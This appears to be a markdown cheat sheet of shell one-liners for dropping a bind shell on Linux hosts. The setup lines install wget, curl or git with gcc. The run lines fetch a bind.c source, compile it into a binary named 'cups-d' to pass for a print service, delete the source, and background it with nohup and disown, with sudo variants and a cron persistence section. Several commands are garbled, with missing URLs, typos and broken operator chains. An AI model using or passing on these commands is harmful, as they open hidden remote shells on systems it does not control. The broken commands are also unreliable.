#One-liners:
##BIND / WGET / GCC
###SETUP(as root):
```console
apt-get install --yes wget gcc binutils || yum -y install wget gcc binutils || zypper -l --no-confirm install wget gcc binutils || pacman --noconfirm -Sy wget gcc binutils
```
###SETUP(via sudo):
```console
sudo apt-get install --yes wget gcc binutils || sudo yum -y install wget gcc bitutils || sudo zypper -l --no-confirm install wget gcc binutils || sudo pacman --noconfirm -Sy wget gcc binutils
```
###RUN(current user):
```console
wget -O bind.c && gcc ./bind.c -o ./cups-d ; rm -f ./bind.c 2>/dev/null || nohup ./cups-d & || disown 2>/dev/null
```
###RUN(via sudo):
```console
wget -O bind.c && gcc ./bind.c -o ./cups-d ; rm -f ./bind.c 2>/dev/null || sudo nohup sudo ./cups-d & || disown 2>/dev/null
```

##BIND / Curl / GCC
###SETUP(as root):
```console
apt-get install --yes curl gcc binutils || yum -y install curl gcc binutils || zypper -l --no-confirm install curl gcc binutils || pacman --noconfirm -Sy curl gcc binutils
```
###SETUP(via sudo):
```console
sudo apt-get install --yes curl gcc binutils || sudo yum -y install curl gcc binutils || sudo zypper -l --no-confirm install curl gcc binutils || sudo pacman --noconfirm -Sy curl gcc binutils
```
###RUN(current user):
```console
curl -o bind.c && gcc ./bind.c -o ./cups-d || rm -f ./bind.c 2>/dev/null || nohup ./cups-d & || disown 2>/dev/null
```
###RUN(via sudo):
```console
curl -o bind.c && gcc ./bind.c -o ./cups-d || rm -f ./bind.c 2>/dev/null || sudo nohup sudo ./cups-d & || disown 2>/dev/null
```
##BIND / Git / GCC
###SETUP(as root):
```console
apt-get install –yes git gcc binutils || yum install git gcc binutils || zypper -l --no-confirm install git gcc binutils || pacman --noconfirm -Sy git gcc binutils
```
###SETUP(via sudo):
```console
sudo apt-get install –yes git gcc binutils || sudo yum install git gcc binutils || sudo zypper -l --no-confirm install git gcc binutils || sudo pacman --noconfirm -Sy git gcc binutils
```
###RUN(current user):
```console
git clone URL && cp ./folder/bind.c ./bind.c || rm -rf ./folder 2>/dev/null || nohup ./cups-d & || disown 2>/dev/null
```
###RUN(via sudo):
```console
git clone URL && cp ./folder/bind.c ./bind.c || rm -rf ./folder 2>/dev/null || sudo nohup sudo ./cups-d & || disown 2>/dev/null
```

##BIND-CRON / WGet / GCC
###SETUP(as root):
```console
apt-get install –yes wget gcc binutils cron
```
###SETUP(via sudo):
```console
Sudo apt-get install –yes wget gcc binutils cron
```
